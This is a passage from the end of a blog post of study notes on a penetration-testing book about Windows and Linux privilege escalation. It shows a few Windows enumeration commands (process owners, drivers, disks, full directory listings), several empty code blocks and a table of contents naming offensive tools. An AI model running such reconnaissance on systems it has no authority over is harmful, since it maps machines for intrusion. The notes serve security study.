+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS&gt; Get-WmiObject -Query &quot;select * from Win32_Process&quot; | where &#123;$_.Name -notlike &quot;svchost*&quot;&#125; | select Name, Handle, @&#123;Label=&quot;Owner&quot;;Expression=&#123;$_.GetOwner().User&#125;&#125; | ft -AutoSize<br></code></pre></td></tr></table></figure>
+<h3 id="Driver-Information"><a href="#Driver-Information" class="headerlink" title="Driver Information"></a>Driver Information</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; driverquery<br></code></pre></td></tr></table></figure>
+<h3 id="Disk-Information"><a href="#Disk-Information" class="headerlink" title="Disk Information"></a>Disk Information</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic logicaldisk get caption,description,providername<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tree d:\ &gt;C:\tree.txt<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dir /s d:\ &gt;C:\file.txt<br></code></pre></td></tr></table></figure>
+<h3 id="Hotfix"><a href="#Hotfix" class="headerlink" title="Hotfix"></a>Hotfix</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; <br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS&gt; <br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PS&gt; <br></code></pre></td></tr></table></figure>
+<h2 id="4-2-Network-Information-Enumeration"><a href="#4-2-Network-Information-Enumeration" class="headerlink" title="4.2 - Network Information Enumeration"></a>4.2 - Network Information Enumeration</h2><h2 id="4-3-User’s-Information-Enumeration"><a href="#4-3-User’s-Information-Enumeration" class="headerlink" title="4.3 - User’s Information Enumeration"></a>4.3 - User’s Information Enumeration</h2><h2 id="4-4-Anti-Virus-Information-Enumeration"><a href="#4-4-Anti-Virus-Information-Enumeration" class="headerlink" title="4.4 - Anti-Virus Information Enumeration"></a>4.4 - Anti-Virus Information Enumeration</h2><h1 id="Chapter-5-Windows-Password-Action"><a href="#Chapter-5-Windows-Password-Action" class="headerlink" title="Chapter.5 - Windows Password Action"></a>Chapter.5 - Windows Password Action</h1><h1 id="Chapter-6-Unsafe-Windows-System-Configuration"><a href="#Chapter-6-Unsafe-Windows-System-Configuration" class="headerlink" title="Chapter.6 - Unsafe Windows System Configuration"></a>Chapter.6 - Unsafe Windows System Configuration</h1><h1 id="Chapter-7-Windows-System-Exploitation-and-Privilege-Escalation"><a href="#Chapter-7-Windows-System-Exploitation-and-Privilege-Escalation" class="headerlink" title="Chapter.7 - Windows System Exploitation and Privilege Escalation"></a>Chapter.7 - Windows System Exploitation and Privilege Escalation</h1><h1 id="Chapter-8-Linux-Information-Enumeration"><a href="#Chapter-8-Linux-Information-Enumeration" class="headerlink" title="Chapter.8 - Linux Information Enumeration"></a>Chapter.8 - Linux Information Enumeration</h1><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2026/01/04/2026-1-4-BookReverseEngineeringCore/">← Next [Book] Reverse Engineering Core (리버스 엔지니어링 핵심 원리)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/01/02/2026-1-2-NoteLanPenetrationGuidelines/">[Book] Intranet Penetration Practice Strategy Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng"><i class="GitHub" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://zeroday.hitcon.org/user/ISSAC_f0ng"><i class="ZeroDay Hitcon" alt="ZeroDay Hitcon"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#El-libro"><span class="toc-number">1.</span> <span class="toc-text">El libro</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">2.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reflection"><span class="toc-number">3.</span> <span class="toc-text">Reflection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-1-Fundamentals"><span class="toc-number">4.</span> <span class="toc-text">Chapter.1 - Fundamentals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-Windows-Privilege-Escalation"><span class="toc-number">4.1.</span> <span class="toc-text">1.2 - Windows Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-User-And-Local-Group"><span class="toc-number">4.1.1.</span> <span class="toc-text">Local User And Local Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACL-Access-Control-List"><span class="toc-number">4.1.2.</span> <span class="toc-text">ACL (Access Control List)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Descriptor"><span class="toc-number">4.1.3.</span> <span class="toc-text">Security Descriptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication"><span class="toc-number">4.1.4.</span> <span class="toc-text">Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token"><span class="toc-number">4.1.5.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Separation-of-Privilege"><span class="toc-number">4.1.6.</span> <span class="toc-text">Separation of Privilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Hash"><span class="toc-number">4.1.7.</span> <span class="toc-text">Windows Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC"><span class="toc-number">4.1.8.</span> <span class="toc-text">UAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Service"><span class="toc-number">4.1.9.</span> <span class="toc-text">Windows Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Registry"><span class="toc-number">4.1.10.</span> <span class="toc-text">Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Linux-Privilege-Escalation"><span class="toc-number">4.2.</span> <span class="toc-text">1.3 - Linux Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-number">4.2.1.</span> <span class="toc-text">User</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Group"><span class="toc-number">4.2.2.</span> <span class="toc-text">User Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Configuration-Files"><span class="toc-number">4.2.3.</span> <span class="toc-text">User Configuration Files</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-2-Environment-Setting-up-and-Tools"><span class="toc-number">5.</span> <span class="toc-text">Chapter.2 - Environment Setting-up and Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Kali-Linux"><span class="toc-number">5.1.</span> <span class="toc-text">2.2 - Kali Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit"><span class="toc-number">5.1.1.</span> <span class="toc-text">Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cobalt-Strike"><span class="toc-number">5.1.2.</span> <span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire-4"><span class="toc-number">5.1.3.</span> <span class="toc-text">Empire 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-PowerShell"><span class="toc-number">5.2.</span> <span class="toc-text">2.3 - PowerShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-WinPEAs"><span class="toc-number">5.3.</span> <span class="toc-text">2.4 - WinPEAs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-PowerUp-and-SharpUp"><span class="toc-number">5.4.</span> <span class="toc-text">2.5 - PowerUp and SharpUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-Accesshk"><span class="toc-number">5.5.</span> <span class="toc-text">2.6 - Accesshk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-cacls-and-icacls"><span class="toc-number">5.6.</span> <span class="toc-text">2.7 - cacls and icacls</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-3-File-Action"><span class="toc-number">6.</span> <span class="toc-text">Chapter.3 - File Action</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Windows"><span class="toc-number">6.1.</span> <span class="toc-text">3.1 - Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-Write-File"><span class="toc-number">6.1.1.</span> <span class="toc-text">Create&#x2F;Write File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-File"><span class="toc-number">6.1.2.</span> <span class="toc-text">Read File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Download-File"><span class="toc-number">6.1.3.</span> <span class="toc-text">Download File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compress-Decompress-File"><span class="toc-number">6.1.4.</span> <span class="toc-text">Compress&#x2F;Decompress File</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Linux"><span class="toc-number">6.2.</span> <span class="toc-text">3.2 - Linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-4-Windows-Information-Enumeration"><span class="toc-number">7.</span> <span class="toc-text">Chapter.4 - Windows Information Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Server-Information-Enumeration"><span class="toc-number">7.1.</span> <span class="toc-text">4.1 - Server Information Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#System-Version"><span class="toc-number">7.1.1.</span> <span class="toc-text">System Version</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Architecture"><span class="toc-number">7.1.2.</span> <span class="toc-text">Architecture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Service-Information"><span class="toc-number">7.1.3.</span> <span class="toc-text">Service Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task"><span class="toc-number">7.1.4.</span> <span class="toc-text">Task</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Driver-Information"><span class="toc-number">7.1.5.</span> <span class="toc-text">Driver Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Disk-Information"><span class="toc-number">7.1.6.</span> <span class="toc-text">Disk Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hotfix"><span class="toc-number">7.1.7.</span> <span class="toc-text">Hotfix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Network-Information-Enumeration"><span class="toc-number">7.2.</span> <span class="toc-text">4.2 - Network Information Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-User%E2%80%99s-Information-Enumeration"><span class="toc-number">7.3.</span> <span class="toc-text">4.3 - User’s Information Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-Anti-Virus-Information-Enumeration"><span class="toc-number">7.4.</span> <span class="toc-text">4.4 - Anti-Virus Information Enumeration</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-5-Windows-Password-Action"><span class="toc-number">8.</span> <span class="toc-text">Chapter.5 - Windows Password Action</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-6-Unsafe-Windows-System-Configuration"><span class="toc-number">9.</span> <span class="toc-text">Chapter.6 - Unsafe Windows System Configuration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-7-Windows-System-Exploitation-and-Privilege-Escalation"><span class="toc-number">10.</span> <span class="toc-text">Chapter.7 - Windows System Exploitation and Privilege Escalation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-8-Linux-Information-Enumeration"><span class="toc-number">11.</span> <span class="toc-text">Chapter.8 - Linux Information Enumeration</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
